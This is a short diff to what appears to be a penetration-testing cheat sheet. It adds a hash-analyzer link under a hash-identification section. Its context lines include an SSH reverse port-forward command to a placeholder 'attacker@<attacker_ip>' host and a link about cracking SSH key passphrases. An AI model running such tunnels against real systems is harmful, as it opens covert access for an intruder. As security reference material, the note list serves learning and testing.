@@ -39,6 +39,7 @@ https://medium.com/bugbountywriteup/cracking-ssh-private-key-passphrase-459ba17e
  - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
 ### HASH
 Identify hashes: https://hashes.com/en/tools/hash_identifier<br />
+- https://www.tunnelsup.com/hash-analyzer/
 Tool to identify hashes: https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master <br />
 - *wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py*<br /> 
 - *python3 hash-id.py*
